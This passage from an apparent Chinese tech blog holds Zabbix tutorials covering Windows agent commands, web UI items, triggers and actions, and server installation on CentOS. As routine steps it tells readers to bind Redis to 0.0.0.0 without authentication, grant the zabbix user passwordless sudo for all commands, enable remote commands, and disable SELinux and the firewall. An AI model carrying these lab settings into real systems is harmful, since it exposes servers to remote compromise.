<p><img src= "/img/loading.gif" data-src="/2020/09/10/windows%20zabbix%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE/image-20200910151248454.png" alt="image-20200910151248454"></p>
<p>新建“主机”,并将Template-OS-Windows-Newly链接到主机</p>
<h4 id="六、启停命令"><a href="#六、启停命令" class="headerlink" title="六、启停命令"></a>六、启停命令</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">zabbix_agentd.exe -c E:\\zabbix\zabbix_agentd.conf –s</span><br><span class="line"></span><br><span class="line">-c：指定配置文件所有位置</span><br><span class="line"></span><br><span class="line">-i：安装客户端</span><br><span class="line"></span><br><span class="line">-s：启动客户端</span><br><span class="line"></span><br><span class="line">-x：停止客户端</span><br><span class="line"></span><br><span class="line">-d：卸载客户端</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>zabbix</category>
      </categories>
      <tags>
        <tag>windows</tag>
        <tag>zabbix</tag>
      </tags>
  </entry>
  <entry>
    <title>zabbix webui基本操作</title>
    <url>/2020/09/11/zabbix%20webui%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="zabbix-webui基本操作"><a href="#zabbix-webui基本操作" class="headerlink" title="zabbix webui基本操作"></a>zabbix webui基本操作</h1><h2 id="1）修改密码及改变语言"><a href="#1）修改密码及改变语言" class="headerlink" title="1）修改密码及改变语言"></a>1）修改密码及改变语言</h2><p>　　如何将页面的英文改成中文<br><img src= "/img/loading.gif" data-src="/2020/09/11/zabbix%20webui%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/1564675388469.png" alt="1564675388469"></p>
<p><img src= "/img/loading.gif" data-src="/2020/09/11/zabbix%20webui%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/1564675440552.png" alt="1564675440552"></p>
<p>记得刷新！</p>
<p>按如上操作即可，选择中文以后，点击下面的update即可更新成功，更新过后是这样子的~<br><img src= "/img/loading.gif" data-src="/2020/09/11/zabbix%20webui%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/1564675495332.png" alt="1564675495332"><br>　　同样的，为了安全起见，把密码改掉：<br><img src= "/img/loading.gif" data-src="/2020/09/11/zabbix%20webui%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/1564675585643.png" alt="1564675585643"><br><img src= "/img/loading.gif" data-src="/2020/09/11/zabbix%20webui%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/1564675640913.png" alt="1564675640913"><br>　　修改完成后同样点击更新即可。</p>
<h2 id="2）创建主机及主机群组"><a href="#2）创建主机及主机群组" class="headerlink" title="2）创建主机及主机群组"></a>2）创建主机及主机群组</h2><p>　　先来定义一个主机群组：<br><img src= "/img/loading.gif" data-src="/2020/09/11/zabbix%20webui%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/1564675771380.png" alt="1564675771380"><br><img src= "/img/loading.gif" data-src="/2020/09/11/zabbix%20webui%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/1564675844179.png" alt="1564675844179"><br>　　然后就可以去添加主机了：</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/11/zabbix%20webui%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/1564675941223.png" alt="1564675941223"></p>
<p><img src= "/img/loading.gif" data-src="/2020/09/11/zabbix%20webui%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/1564676166889.png" alt="1564676166889"><br>　<br>　　设置完成后，点击添加。就可以看到，添加的这个主机已经出现在列表中了：<br><img src= "/img/loading.gif" data-src="/2020/09/11/zabbix%20webui%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/1564676324423.png" alt="1564676324423">
　　</p>
<h2 id="3）监控项-items"><a href="#3）监控项-items" class="headerlink" title="3）监控项(items)"></a>3）监控项(items)</h2><h3 id="①-介绍"><a href="#①-介绍" class="headerlink" title="① 介绍"></a>① 介绍</h3><p>　　点击上图中none1的监控项，即可创建的监控项，首先，创建三个应用集：</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/11/zabbix%20webui%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/1564676547894.png" alt="1564676547894"></p>
<p><img src= "/img/loading.gif" data-src="/2020/09/11/zabbix%20webui%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/1564676568268.png" alt="1564676568268"></p>
<p><img src= "/img/loading.gif" data-src="/2020/09/11/zabbix%20webui%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/1564676584446.png" alt="1564676584446"></p>
<p><img src= "/img/loading.gif" data-src="/2020/09/11/zabbix%20webui%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/1564676609295.png" alt="1564676609295"></p>
<p><img src= "/img/loading.gif" data-src="/2020/09/11/zabbix%20webui%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/1564676660313.png" alt="1564676660313"><br>　　然后来定义监控项：<br><img src= "/img/loading.gif" data-src="/2020/09/11/zabbix%20webui%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/1564676702052.png" alt="1564676702052"><br><img src= "/img/loading.gif" data-src="/2020/09/11/zabbix%20webui%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/1204916-20171202112003964-2111199567.png" alt="img"></p>
<p>​    任何一个被监控项，如果想要能够被监控，一定要在zabbix-server端定义了能够连接至zabbix-agent端，并且能够获取命令。或者在agent端定义了能够让server端获取命令。一般都是内建的命令，都对应的有其名字，被称之为<code>key</code>。</p>
<p>下面监控的是cpu的每秒中断次数</p>
<p>in 每秒CPU的中断次数，包括时间中断</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/11/zabbix%20webui%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/1204916-20171202112012245-1626032764.png" alt="img"><br>　　关于key值，可以直接在网页上设置(服务器自动执行)，也可以使用命令行命令(手动执行)来获取：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@zabbix-server zabbix]# zabbix_get -s 192.168.246.226 -p 10050 -k "system.cpu.intr"</span><br></pre></td></tr></table></figure>

<p>在的agent端，也可以使用命令来查看<code>intr</code>的速率变化：<br><img src= "/img/loading.gif" data-src="/2020/09/11/zabbix%20webui%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/1204916-20171202112020401-1045624944.png" alt="img"><br>　　继续来看的监控项：<br><img src= "/img/loading.gif" data-src="/2020/09/11/zabbix%20webui%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/1204916-20171202112109354-402789781.png" alt="img"><br>　　zabbix会收集历史数据，以及还会收集每小时的平均数据作为趋势数据，每小时才收集一次，所以trends（趋势）占用的资源很小，说了这么多，来简单定义一个：</p>
<h3 id="②-定义一个监控项"><a href="#②-定义一个监控项" class="headerlink" title="② 定义一个监控项"></a>② 定义一个监控项</h3><p><img src= "/img/loading.gif" data-src="/2020/09/11/zabbix%20webui%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/1564677303575.png" alt="1564677303575"></p>
<p><img src= "/img/loading.gif" data-src="/2020/09/11/zabbix%20webui%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/1564677339503.png" alt="1564677339503"></p>
<p>下面这两张图做不做都行</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/11/zabbix%20webui%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/1564677365553.png" alt="1564677365553"></p>
<p><img src= "/img/loading.gif" data-src="/2020/09/11/zabbix%20webui%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/1204916-20171202112129120-1208851776.png" alt="img"><br>　　设置完以后，点击更新，即可加入，并会自动跳转至下图页面：<br><img src= "/img/loading.gif" data-src="/2020/09/11/zabbix%20webui%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/1204916-20171202112140370-1431227410.png" alt="img"><br>　　定义完成，回到所有主机，等待5秒，可以看到，none1节点后面的选项已经有变成绿色的了：如果不亮记得刷新<br><img src= "/img/loading.gif" data-src="/2020/09/11/zabbix%20webui%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/1564677450965.png" alt="1564677450965"><br>　　也可以回到的仪表盘，可以看到，的监控项有一个处于启用状态：<br><img src= "/img/loading.gif" data-src="/2020/09/11/zabbix%20webui%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/1204916-20171202112155151-1543121497.png" alt="img"><br>　　那么，的数据在哪里呢？可以点击<code>最新数据</code>，把的none1节点添加至主机，应用一下，就可以看到下面的状态了：<br><img src= "/img/loading.gif" data-src="/2020/09/11/zabbix%20webui%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/1204916-20171202112203042-1797920804.png" alt="img"><br>　　可以看到，还有一个图形页面，点进去则可以看图形的分布：<br><img src= "/img/loading.gif" data-src="/2020/09/11/zabbix%20webui%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/1204916-20171202112209995-1913438877.png" alt="img"><br>　　事实上，关注的指标有很多种，一一添加进来即可。<br>　　刚刚定义的监控项是很简单的，指定一个<code>key</code>即可，但是有些监控项是带有参数的，这样一来，的监控项就有更多的灵活性。接下来，来简单说明一个需要带参数的监控项：</p>
<h3 id="③-快速定义类似指标"><a href="#③-快速定义类似指标" class="headerlink" title="③ 快速定义类似指标"></a>③ 快速定义类似指标</h3><p>　　如果想要定义一个类似的指标，可以直接选择克隆，然后简单的修改一点点参数即可。</p>
<h3 id="④-删除监控项"><a href="#④-删除监控项" class="headerlink" title="④ 删除监控项"></a>④ 删除监控项</h3><p>　　如果有一个监控项，用不上了，就可以删除掉。但是如果你直接删除的话，默认数据是会留下的，所以要先清除数据，然后再删除，具体操作步骤如下：<br><img src= "/img/loading.gif" data-src="/2020/09/11/zabbix%20webui%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/1204916-20171202112656808-290199455.png" alt="img"></p>
<h2 id="4）触发器（trigger）"><a href="#4）触发器（trigger）" class="headerlink" title="4）触发器（trigger）"></a>4）触发器（trigger）</h2><h3 id="①-简介"><a href="#①-简介" class="headerlink" title="① 简介"></a>① 简介</h3><p>　　当的采集的值定义完了以后，就可以来定义触发器了。<br>　　触发器的定义是：<strong>界定某特定的item采集到的数据的非合理区间或非合理状态。通常为逻辑表达式。</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">一般，评定采样数值是否为合理区间的比较稳妥的方法是——根据最后N次的平均值来判定结果；这个最后N次通常有两种定义方式：</span><br><span class="line">1. 最近N分钟所得结果的平均值</span><br><span class="line">2. 最近N次所得结果的平均值</span><br></pre></td></tr></table></figure>

<p>　　<strong>注：能用数值保存的就不要使用字符串</strong></p>
<h3 id="②-触发器表达式"><a href="#②-触发器表达式" class="headerlink" title="② 触发器表达式"></a>② 触发器表达式</h3><p>　　基本的触发器表达式格式如下所示</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&#123;&lt;server&gt;:&lt;key&gt;.&lt;function&gt;(&lt;parameter&gt;)&#125;&lt;operator&gt;&lt;constant&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>server</code>：主机名称；</li>
<li><code>key</code>：主机上关系的相应监控项的key；</li>
<li><code>function</code>：评估采集到的数据是否在合理范围内时所使用的函数,目前触发器所支持的函数有avg(平均)、count(计数)、change(变化)、date(日期)、dayofweek(星期)、delta(增量)、diff、iregexp、last()、max(最大值)、min(最小值)、nodata(无数据)、now(现在)、sum(总和)等</li>
<li><code>parameter</code>：函数参数；大多数数值函数可以接受秒数为其参数，而如果在数值参数之前使用“#”做为前缀，则表示为最近几次的取值，如sum(300)表示300秒内所有取值之和，而sum(#10)则表示最近10次取值之和；</li>
</ul>
<h3 id="③-定义一个触发器"><a href="#③-定义一个触发器" class="headerlink" title="③ 定义一个触发器"></a>③ 定义一个触发器</h3><p>　　可以查看一下<code>rate of packets(in)</code>的值，并以其为标准确定的非正常的值：<br><img src= "/img/loading.gif" data-src="/2020/09/11/zabbix%20webui%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/1204916-20171202112737792-579321512.png" alt="img"><br>　　图中可以看出，的最大值为74，最小值为4，平均值为24。这样的话，可以定义5以上的都是非正常的值。<br>　　下面来定义一个触发器：<br>　　进入：配置 —&gt; 主机 —&gt; none1 —&gt; 触发器 —&gt; 创建触发器</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/11/zabbix%20webui%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/1570429244965.png" alt="1570429244965"></p>
<p><img src= "/img/loading.gif" data-src="/2020/09/11/zabbix%20webui%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/1204916-20171202112834464-1059691900.png" alt="img"><br>　　的表达式可以直接点击右侧的添加，然后定义自己所需的内容，即可自动生成：</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/11/zabbix%20webui%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/1564734886717.png" alt="1564734886717"></p>
<p>　　生成完毕后，就点击页面下方的添加，即成功定义了一个触发器，同时页面自动跳转：<br><img src= "/img/loading.gif" data-src="/2020/09/11/zabbix%20webui%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/1204916-20171202112850323-852492156.png" alt="img"><br>　　然后去看一下刚刚定义了触发器的那个监控项：<br><img src= "/img/loading.gif" data-src="/2020/09/11/zabbix%20webui%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/1564734970479.png" alt="1564734970479"><br>　　可以看出，这个里面就有了一根线，就是刚刚定义的值，超过线的即为异常状态，看起来非常直观。<br>　　但是，现在即使超过了这根线，也仅仅会产生一个触发器事件而不会做其他任何事。因此，就需要去定义一个动作(action)。</p>
<h2 id="5）定义动作（action）"><a href="#5）定义动作（action）" class="headerlink" title="5）定义动作（action）"></a>5）定义动作（action）</h2><h3 id="①-简介-1"><a href="#①-简介-1" class="headerlink" title="① 简介"></a>① 简介</h3><p>　　需要去基于一个对应的事件为条件来指明该做什么事，一般就是执行远程命令或者发警报。</p>
<p><strong>第一，要事先定义一个媒介，第二，还要定义这个媒介上用户接收消息的端点（当然，在用户上，也称之为用户的媒介）。</strong><br>　　可以去看一下系统内建的媒介类型：<br><img src= "/img/loading.gif" data-src="/2020/09/11/zabbix%20webui%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/1204916-20171202112953417-570252961.png" alt="img"><br>　　这只是大的媒介类型，里面还有更多的细分，以<code>Email</code>为例：</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/11/zabbix%20webui%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/1585015660972.png" alt="img"><br>　　同样的，同一个类型也可以定义多个，还是以<code>Email</code>为例，可以定义一个腾讯的服务器，一个网易的服务器，一个阿里的服务器等等。</p>
<h3 id="②-定义一个媒介（media）"><a href="#②-定义一个媒介（media）" class="headerlink" title="② 定义一个媒介（media）"></a>② 定义一个媒介（media）</h3><p>　　还是以<code>Email</code>为例。来简单的定义一个媒介：<br><img src= "/img/loading.gif" data-src="/2020/09/11/zabbix%20webui%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/1204916-20171202113015417-958398301.png" alt="img"><br><img src= "/img/loading.gif" data-src="/2020/09/11/zabbix%20webui%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/1204916-20171202113021495-491076870.png" alt="img"><br>　　这样定义以后，去更新一下就可以了。<br>　　媒介定义好了，那么怎么才能够然后用户接收到邮件呢？比如让的Admin用户接收邮件<br>　　进入 管理 —&gt; 用户 —&gt; Admin —&gt; 报警媒介<br>　　来添加一条进来：<br><img src= "/img/loading.gif" data-src="/2020/09/11/zabbix%20webui%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/1204916-20171202113030042-693976775.png" alt="img"><br>　　添加过后是这样的：<br><img src= "/img/loading.gif" data-src="/2020/09/11/zabbix%20webui%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/1204916-20171202113038792-215702532.png" alt="img"><br>　　然后更新就可以了。<br>　　<strong>一个用户可以添加多个接收的媒介类型。</strong></p>
<h3 id="③-定义一个动作（action）"><a href="#③-定义一个动作（action）" class="headerlink" title="③ 定义一个动作（action）"></a>③ 定义一个动作（action）</h3><p>　　之前说过了，动作是在某些特定条件下触发的，比如，某个触发器被触发了，就会触发动作。<br>　　现在，基于redis来定义一个动作。<br>　　首先，在agent端使用yum安装一下<code>redis</code>：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@zabbix-agent-none1 ~]# yum -y install epel-release</span><br><span class="line">[root@zabbix-agent-none1 ~]# yum install -y redis</span><br></pre></td></tr></table></figure>

<p>　　修改一下配置文件：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@zabbix-agent-none1 ~]# vim /etc/redis.conf </span><br><span class="line">bind 0.0.0.0        #不做任何认证操作</span><br></pre></td></tr></table></figure>

<p>　　修改完成以后，启动服务，并检查端口：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@zabbix-agent-none1 ~]# systemctl start redis</span><br><span class="line">[root@zabbix-agent-none1 ~]# netstat -lntp | grep redis </span><br><span class="line">tcp        0      0 0.0.0.0:6379            0.0.0.0:*               LISTEN      1353/redis-server 0</span><br></pre></td></tr></table></figure>

<p>　　接着，就可以去网站上来定义相关的操作了：</p>
<p>创建一个应用集：</p>
<p>配置—–主机—none1—应用集—创建应用集:</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/11/zabbix%20webui%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/1564735631330.png" alt="1564735631330"></p>
<h4 id="1-定义监控项"><a href="#1-定义监控项" class="headerlink" title="1.定义监控项"></a>1.定义监控项</h4><p>　　进入 配置 —&gt; 主机 —&gt; node1 —&gt; 监控项（items）—&gt; 创建监控项<br><img src= "/img/loading.gif" data-src="/2020/09/11/zabbix%20webui%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/1204916-20171202113104229-190921891.png" alt="img"><br>　　填写完毕以后，点击下方的添加。<br><img src= "/img/loading.gif" data-src="/2020/09/11/zabbix%20webui%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/1564735710106.png" alt="1564735710106"><br>　　该监控项已成功添加。<br>　　可以去查看一下它的值：<br>　　检测中 —&gt; 最新数据<br><img src= "/img/loading.gif" data-src="/2020/09/11/zabbix%20webui%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/1204916-20171202113122433-2129349774.png" alt="img"></p>
<h4 id="2-定义触发器"><a href="#2-定义触发器" class="headerlink" title="2.定义触发器"></a>2.定义触发器</h4><p>　　定义好了监控项以后，亦可来定义一个触发器，当服务有问题的时候，才能及时知道：<br>　　进入 配置 —&gt; 主机 —&gt; none1 —&gt; 触发器（trigger）—&gt; 创建触发器<br><img src= "/img/loading.gif" data-src="/2020/09/11/zabbix%20webui%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/1204916-20171202113131761-6927531.png" alt="img"><br><img src= "/img/loading.gif" data-src="/2020/09/11/zabbix%20webui%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/1564735847827.png" alt="1564735847827">　　填写完毕以后，点击下方的添加。</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/11/zabbix%20webui%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/1204916-20171202113142604-1237551286.png" alt="img"><br>　　该触发器已成功添加。<br>　　去查看一下：<br>　　监测中 —&gt; 最新数据<br><img src= "/img/loading.gif" data-src="/2020/09/11/zabbix%20webui%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/1564735926322.png" alt="1564735926322"><br>　　来手动关闭redis服务来检测一下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@zabbix-agent-none1 ~]# systemctl stop redis</span><br></pre></td></tr></table></figure>

<p>　　进入 监测中 —&gt; 问题<br><img src= "/img/loading.gif" data-src="/2020/09/11/zabbix%20webui%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/1570431719623.png" alt="1570431719623"><br>　　可以看到，现在已经显示的是问题了。并且有持续的时间，当服务被打开，会转为已解决状态：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@zabbix-agent-none1 ~]# systemctl start redis</span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-src="/2020/09/11/zabbix%20webui%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/1570431765655.png" alt="1570431765655"></p>
<h4 id="3-定义动作（action）"><a href="#3-定义动作（action）" class="headerlink" title="3.定义动作（action）"></a>3.定义动作（action）</h4><p>　　现在就可以去定义action了。</p>
<p>　　进入 配置 —&gt; 动作 —&gt; 创建动作（注意选择事件源为触发器）<br><img src= "/img/loading.gif" data-src="/2020/09/11/zabbix%20webui%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/1204916-20171202113224323-1883182490.png" alt="img"></p>
<p><img src= "/img/loading.gif" data-src="/2020/09/11/zabbix%20webui%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/1564738293493.png" alt="1564738293493"></p>
<p><img src= "/img/loading.gif" data-src="/2020/09/11/zabbix%20webui%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/1204916-20171202113232620-704184287.png" alt="img"><br>　　可以进行操作添加：<br><img src= "/img/loading.gif" data-src="/2020/09/11/zabbix%20webui%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/1204916-20171202113245604-1217342753.png" alt="img"><br>　　可以看出，还需要在虚拟机上进行两项操作，一是修改sudo配置文件使zabbix用户能够临时拥有管理员权限；二是修改zabbix配置文件使其允许接收远程命令。进行如下操作：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@zabbix-agent-none1 ~]# visudo          #相当于“vim /etc/sudoers”</span><br><span class="line">    ## Allow root to run any commands anywhere</span><br><span class="line">    root    ALL=(ALL)   ALL</span><br><span class="line">    zabbix    ALL=(ALL)   NOPASSWD: ALL     #添加的一行，表示不需要输入密码</span><br><span class="line"></span><br><span class="line">[root@zabbix-agent-none1 ~]# vim /etc/zabbix/zabbix_agentd.conf</span><br><span class="line">    EnableRemoteCommands=1          #允许接收远程命令</span><br><span class="line">    LogRemoteCommands=1             #把接收的远程命令记入日志</span><br><span class="line"></span><br><span class="line">[root@zabbix-agent-none1 ~]# systemctl restart zabbix-agent.service</span><br></pre></td></tr></table></figure>

<p>添加了第一步需要做的事情，也就是重启服务，如果重启不成功怎么办呢？就需要来添加第二步：<br><img src= "/img/loading.gif" data-src="/2020/09/11/zabbix%20webui%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/1204916-20171202113256073-936532007.png" alt="img"><br>　　添加完成以后，可以看一下：<br><img src= "/img/loading.gif" data-src="/2020/09/11/zabbix%20webui%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/1204916-20171202113304573-1567962822.png" alt="img"><br>　　操作添加完了，如果服务自动恢复了，可以发送消息来提示：<br><img src= "/img/loading.gif" data-src="/2020/09/11/zabbix%20webui%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/1204916-20171202113312104-1066002380.png" alt="img"><br>　　至此，的动作设置完毕，可以点击添加了，添加完成会自动跳转至如下页面：<br><img src= "/img/loading.gif" data-src="/2020/09/11/zabbix%20webui%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/1564738437126.png" alt="1564738437126"><br>　　现在可以手动停止服务来进行测试：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@zabbix-agent-none1 ~]# systemctl stop redis.service</span><br></pre></td></tr></table></figure>

<p>　　然后来到问题页面来查看，发现确实有问题，并且已经解决： 等一会<br><img src= "/img/loading.gif" data-src="/2020/09/11/zabbix%20webui%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/1564736992596.png" alt="1564736992596"><br>　<br>也可以去agent端查看端口是否开启：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@zabbix-agent-none1 ~]# systemctl stop redis </span><br><span class="line">[root@zabbix-agent-none1 ~]# netstat -lntp | grep redis </span><br><span class="line">[root@zabbix-agent-none1 ~]# netstat -lntp | grep redis </span><br><span class="line">tcp        0      0 0.0.0.0:6379            0.0.0.0:*               LISTEN      1957/redis-server 0</span><br><span class="line"></span><br><span class="line">查看邮箱是否成功</span><br><span class="line">[root@zabbix-server ~]# yum -y install mailx</span><br><span class="line">[root@zabbix-server ~]# mail</span><br><span class="line">Heirloom Mail version 12.5 7/5/10.  Type ? for help.</span><br><span class="line">"/var/spool/mail/root": 1 message 1 unread</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">U  1 zabbix@localhost.loc  Thu Oct 10 00:51  21/865   <span class="string">"Resolved: redis service down"</span></span></span><br><span class="line"></span><br><span class="line">邮箱也已经成功</span><br></pre></td></tr></table></figure>

<p>　　可以看出端口正常开启，动作触发已经完成。</p>
<blockquote>
<p>补充：也可以使用脚本来发送警报，脚本存放路径在配置文件中可以找到，定义为：<code>AlterScriptsPath=/usr/lib/zabbix/alertscripts</code></p>
</blockquote>
<p>然后将这个动作关闭掉为后期的邮件报警做准备。</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/11/zabbix%20webui%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/1564759439756.png" alt="1564759439756"></p>
<p><img src= "/img/loading.gif" data-src="/2020/09/11/zabbix%20webui%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/1564759454896.png" alt="1564759454896"></p>
]]></content>
      <categories>
        <category>zabbix</category>
      </categories>
      <tags>
        <tag>zabbix</tag>
      </tags>
  </entry>
  <entry>
    <title>zabbix-server部署</title>
    <url>/2020/09/10/zabbix-server%E9%83%A8%E7%BD%B2/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="zabbix-server部署"><a href="#zabbix-server部署" class="headerlink" title="zabbix-server部署"></a>zabbix-server部署</h1><h3 id="1、准备"><a href="#1、准备" class="headerlink" title="1、准备"></a>1、准备</h3><p>　　centos7.5 系统服务器3台、 一台作为监控服务器， 两台作为被监控节点， 配置好yum源、 防火墙关闭、 各节点时钟服务同步、 各节点之间可以通过主机名互相通信。<br><strong>1）所有机器关闭防火墙和selinux</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">setenforce 0 （修改配置文件关闭）</span><br><span class="line">sed -i 's/SELINUX=enforcing/SELINUX=disabled/' /etc/selinux/config </span><br><span class="line">systemctl stop firewalld.service</span><br><span class="line">systemctl disable firewalld.service</span><br></pre></td></tr></table></figure>

<p><strong>2）根据架构图，实验基本设置如下：</strong></p>
<table>
<thead>
<tr>
<th>机器名称</th>
<th>IP配置</th>
<th>服务角色</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>server</td>
<td>192.168.246.228</td>
<td>zabbix-server</td>
<td>开启监控功能</td>
</tr>
<tr>
<td>node1</td>
<td>192.168.246.226</td>
<td>zabbix-agent-none1</td>
<td>开启</td>
</tr>
<tr>
<td>node2</td>
<td>192.168.246.227</td>
<td>zabbix-agent-none2</td>
<td>开启</td>
</tr>
</tbody></table>
<h3 id="2、Zabbix的安装，安装server端"><a href="#2、Zabbix的安装，安装server端" class="headerlink" title="2、Zabbix的安装，安装server端"></a>2、Zabbix的安装，安装server端</h3><h4 id="1）更新yum仓库"><a href="#1）更新yum仓库" class="headerlink" title="1）更新yum仓库"></a>1）更新yum仓库</h4><p>　　我们去官网下载一个包<code>zabbix-release-3.4-2.el7.noarch.rpm</code>，本地安装至我们的虚拟机，这样，我们本地就有了新的yum源，可以直接安装zabbix服务：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@zabbix-server ~]# rpm -ivh http://repo.zabbix.com/zabbix/3.4/rhel/7/x86_64/zabbix-release-3.4-2.el7.noarch.rpm</span><br></pre></td></tr></table></figure>

<p>　　而后更新我们的yum仓库：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@zabbix-server ~]# yum repolist</span><br><span class="line">Loaded plugins: fastestmirror, langpacks  </span><br><span class="line">Loading mirror speeds from cached hostfile</span><br><span class="line">zabbix-non-supported                                                      4/4</span><br><span class="line">repo id                     repo name                                   status</span><br><span class="line">base                        base                                         9,363</span><br><span class="line">epel                        epel                                        11,349</span><br><span class="line">zabbix/x86_64               Zabbix Official Repository - x86_64             80</span><br><span class="line">zabbix-non-supported/x86_64 Zabbix Official Repository non-supported -       4</span><br><span class="line">repolist: 20,796</span><br></pre></td></tr></table></figure>

<p>安装：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@zabbix-server ~]# yum install zabbix-server-mysql zabbix-web-mysql  zabbix-agent -y</span><br><span class="line">[root@zabbix-server ~]# yum install -y zabbix-get-3.4.0-1.el7.x86_64</span><br></pre></td></tr></table></figure>

<p>zabbix-server-mysql数据库是用来存放采集到的数据,而<em>zabbix</em>-web-<em>mysql</em>的作用是Zabbix的web端会通过这些数据,来展示绘图</p>
